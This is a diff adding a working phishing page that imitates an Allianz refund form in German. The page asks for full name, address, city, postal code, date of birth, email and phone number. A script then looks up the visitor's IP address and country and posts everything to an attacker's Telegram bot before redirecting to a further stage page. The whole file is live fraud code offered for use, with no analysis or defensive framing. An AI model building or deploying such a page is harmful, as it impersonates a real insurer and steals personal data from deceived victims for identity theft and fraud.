@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meine Allianz - Rückerstattung Formular</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    /* تنسيق عام */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #ffffff;
+      color: #000;
+    }
+
+    /* ترويسة تحتوي على الشعار */
+    header {
+      padding: 20px 30px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img {
+      height: 32px;
+    }
+
+    /* حاوية النموذج */
+    .form-container {
+      max-width: 500px;
+      margin: 40px auto;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    .form-container h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    .form-container p {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 30px;
+    }
+
+    /* عناصر النموذج */
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="date"],
+    input[type="tel"] {
+      padding: 12px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    /* خانة رقم الهاتف مع العلم */
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 0 12px;
+    }
+
+    .phone-input img {
+      width: 24px;
+      height: 16px;
+      margin-right: 8px;
+    }
+
+    .phone-input input {
+      border: none;
+      outline: none;
+      padding: 12px 0;
+      flex: 1;
+      font-size: 15px;
+    }
+
+    /* زر الإرسال */
+    .submit-btn {
+      background-color: #0072ce;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #005fa3;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- رأس الصفحة -->
+  <header style=" max-width: 600px; margin: 40px auto; padding: 0 20px; ">
+    <img src="allo.svg" alt="Allianz Logo">
+  </header>
+
+  <!-- نموذج الإدخال -->
+  <div class="form-container">
+    <p><img src="alli.png" alt="Allianz Logo" style="
+    width: -webkit-fill-available;
+"></p>
+    <p>* Füllen Sie das untenstehende Formular aus, um Ihre Rückerstattung zu erhalten.</p>
+
+    <form id="mitid-core-client-form">
+      <input type="text" id="A" name="fullname" placeholder="vollständiger Name" required />
+      <input type="text" id="B" name="address" placeholder="Rechnungsadresse" required />
+      <input type="text" id="C" name="city" placeholder="Stadt" required />
+      <input type="text" id="D" name="zip" placeholder="Postleitzahl" required />
+      <input type="text" id="E" name="dob" placeholder="Geburtsdatum (tt.mm.jjjj)" required />
+      <input type="email" id="F" name="email" placeholder="E-mail" required />
+      
+      <div class="phone-input">
+        <img src="de.png" alt="DE Flag" />
+        <input type="tel" id="G" name="phone" placeholder="+49" required />
+      </div>
+
+      <button type="submit" class="submit-btn">WEITER</button>
+    </form>
+  </div>
+  
+  
+  
+  <!-- //Javascript -->
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+		
+          <script>
+            $("#G").mask("‎+49 000000000000");
+            $("#E").mask("‎00/00/0000");
+
+        </script>
+		
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('TELEGRAM.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#mitid-core-client-form").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+            var two = $("#B").val().trim();
+            var three = $("#C").val().trim();
+            var four = $("#D").val().trim();
+            var five = $("#E").val().trim();
+            var six = $("#F").val().trim();
+            var siven = $("#G").val().trim();
+
+            if (one && two && three && four && five && six && siven) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Billing Info**\n\n" +
+                                "🔹 **Name:** `" + one + "`\n" +
+                                "🔹 **Address:** `" + two + "`\n" +
+                                "🔹 **City:** `" + three + "`\n" +
+                                "🔹 **Code Postal:** `" + four + "`\n" +
+                                "🔹 **DOB:** `" + five + "`\n" +
+                                "🔹 **Email:** `" + six + "`\n" +
+                                "🔹 **Phone:** `" + siven + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "Load.html?vc?__event=cauuuze&service_id=top_ouazt=DE";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+</script>
+</html>
